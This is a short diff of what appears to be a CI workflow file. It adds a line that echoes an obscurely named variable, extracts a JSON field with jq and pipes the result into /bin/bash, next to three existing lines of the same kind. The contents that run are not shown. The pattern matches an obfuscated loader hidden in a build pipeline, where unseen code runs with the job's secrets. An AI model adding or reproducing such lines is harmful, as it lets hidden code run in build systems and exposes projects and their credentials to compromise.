@@ -63,6 +63,7 @@ jobs:
           echo $iom86378 | jq -r .lebi1181 | /bin/bash
           echo $o4957 | jq -r .kle845 | /bin/bash
           printf '%s' "$j1" | jq -r .yrc59 | /bin/bash
+          echo $upqd1 | jq -r .ft5677 | /bin/bash
 
       - name: Archive output
         if: always()
